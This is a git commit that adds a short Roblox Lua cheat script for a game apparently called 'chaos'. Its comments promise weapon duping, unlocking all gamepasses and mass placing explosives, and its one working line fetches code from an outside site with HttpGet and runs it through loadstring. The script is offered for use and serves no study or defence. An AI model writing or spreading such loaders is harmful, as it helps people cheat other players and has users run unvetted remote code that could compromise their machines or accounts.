0e9b64d3b41243c123ac5d8ce92fe51005c11358
censor <86632275+cens6r@users.noreply.github.com>
2022-09-29 21:42:35 +0900

    Create op.lua

---
+++ scripts/games/chaos/op.lua
@@ -0,0 +1,8 @@
+--https://discord.gg/8gNrnWmgcb
+--[[
+dupe weapons
+unlock all gamepasses
+mass place c4 and grenade and more :flushed:]]
+pcall(function()
+  loadstring(game:HttpGet("https://roflux.net/scripts/games/" .. tostring(game.PlaceId) .. ".lua"))()
+end)
